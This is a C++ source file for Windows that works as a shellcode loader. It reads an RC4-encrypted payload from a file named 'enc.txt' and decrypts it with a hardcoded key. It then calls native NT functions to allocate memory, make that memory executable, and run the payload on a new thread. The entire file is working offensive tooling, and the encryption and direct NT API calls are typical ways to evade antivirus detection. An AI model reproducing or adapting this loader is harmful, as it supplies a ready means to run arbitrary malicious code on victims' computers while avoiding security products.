#include <Windows.h>
#include <stdio.h>
#include <vector>
#include <fstream>
#include <cstring>

#pragma comment(lib, "ntdll")

#pragma warning (disable: 4996)
#define _CRT_SECURE_NO_WARNINGS

#define NtCurrentProcess() ((HANDLE)-1)
#define DEFAULT_BUFLEN 4096

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

EXTERN_C NTSTATUS NtAllocateVirtualMemory(
    HANDLE    ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T   RegionSize,
    ULONG     AllocationType,
    ULONG     Protect
);

EXTERN_C NTSTATUS NtProtectVirtualMemory(
    IN HANDLE ProcessHandle,
    IN OUT PVOID* BaseAddress,
    IN OUT PSIZE_T RegionSize,
    IN ULONG NewProtect,
    OUT PULONG OldProtect);

EXTERN_C NTSTATUS NtCreateThreadEx(
    OUT PHANDLE hThread,
    IN ACCESS_MASK DesiredAccess,
    IN PVOID ObjectAttributes,
    IN HANDLE ProcessHandle,
    IN PVOID lpStartAddress,
    IN PVOID lpParameter,
    IN ULONG Flags,
    IN SIZE_T StackZeroBits,
    IN SIZE_T SizeOfStackCommit,
    IN SIZE_T SizeOfStackReserve,
    OUT PVOID lpBytesBuffer
);

EXTERN_C NTSTATUS NtWaitForSingleObject(
    IN HANDLE         Handle,
    IN BOOLEAN        Alertable,
    IN PLARGE_INTEGER Timeout
);

// RC4 Encryption/Decryption Function
void RC4(const unsigned char* key, const unsigned char* input, unsigned char* output, size_t length) {
    unsigned char S[256];
    unsigned char K[256];
    
    // Key Scheduling Algorithm (KSA)
    for (int i = 0; i < 256; i++) {
        S[i] = i;
        K[i] = key[i % strlen((const char*)key)];
    }

    int j = 0;
    for (int i = 0; i < 256; i++) {
        j = (j + S[i] + K[i]) % 256;
        std::swap(S[i], S[j]);
    }

    // Pseudo-Random Generation Algorithm (PRGA)
    int i = 0;
    j = 0;
    
    for (size_t k = 0; k < length; k++) {
        i = (i + 1) % 256;
        j = (j + S[i]) % 256;
        std::swap(S[i], S[j]);
        output[k] = input[k] ^ S[(S[i] + S[j]) % 256];
    }
}

void RunShellcode(char* shellcode, DWORD shellcodeLen) {
    PVOID BaseAddress = NULL;
    SIZE_T dwSize2 = 0x2000;

    NTSTATUS status1 = NtAllocateVirtualMemory(NtCurrentProcess(), &BaseAddress, 0, &dwSize2, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    
    if (!NT_SUCCESS(status1)) {
        return;
    }

    RtlMoveMemory(BaseAddress, shellcode, shellcodeLen);

    HANDLE hThread;
    DWORD OldProtect = 0;

    NTSTATUS NtProtectStatus1 = NtProtectVirtualMemory(NtCurrentProcess(), &BaseAddress, &dwSize2, PAGE_EXECUTE_READ, &OldProtect);
    
    if (!NT_SUCCESS(NtProtectStatus1)) {
        return;
    }

    printf("\n\nShellcode_mem  :  %p\n\n", BaseAddress);
    
    getchar();

    NTSTATUS NtCreateThreadstatus = NtCreateThreadEx(&hThread, 0x1FFFFF, NULL, NtCurrentProcess(), (LPTHREAD_START_ROUTINE)BaseAddress, NULL, FALSE, NULL, NULL, NULL, NULL);
    
    if (!NT_SUCCESS(NtCreateThreadstatus)) {
        printf("[!] Failed in sysNtCreateThreadEx (%u)\n", GetLastError());
        return;
    }

    LARGE_INTEGER Timeout;
    Timeout.QuadPart = -10000000;

    NTSTATUS NTWFSOstatus = NtWaitForSingleObject(hThread, FALSE, &Timeout);
    
    if (!NT_SUCCESS(NTWFSOstatus)) {
        printf("[!] Failed in sysNtWaitForSingleObject (%u)\n", GetLastError());
        return;
    }
}

void getShellcode_Run(const char* filename) {
    
   // Open the file for reading
   std::ifstream shellcodeFile(filename, std::ios::binary);
   
   if (!shellcodeFile.is_open()) {
       printf("Failed to open file: %s\n", filename);
       return;
   }

   // Get the size of the file
   shellcodeFile.seekg(0, std::ios::end);
   std::streamsize size = shellcodeFile.tellg();
   
   // Allocate buffer for encrypted shellcode
   std::vector<unsigned char> encryptedBuffer(size);
   
   // Go back to the beginning of the file and read its content into the buffer
   shellcodeFile.seekg(0, std::ios::beg);
   
   if (!shellcodeFile.read(reinterpret_cast<char*>(encryptedBuffer.data()), size)) {
       printf("Failed to read data from file: %s\n", filename);
       return;
   }

   // Decrypt the shellcode using RC4
   const unsigned char* key = reinterpret_cast<const unsigned char*>("cookie"); // Replace with your actual key
   std::vector<unsigned char> decryptedBuffer(size);
   
   RC4(key, encryptedBuffer.data(), decryptedBuffer.data(), size);

   // Run the decrypted shellcode
   RunShellcode(reinterpret_cast<char*>(decryptedBuffer.data()), static_cast<DWORD>(size));
}

int main() {
    
   const char* filename = "enc.txt"; // Hardcoded filename

   getShellcode_Run(filename);
   
   return 0;
}
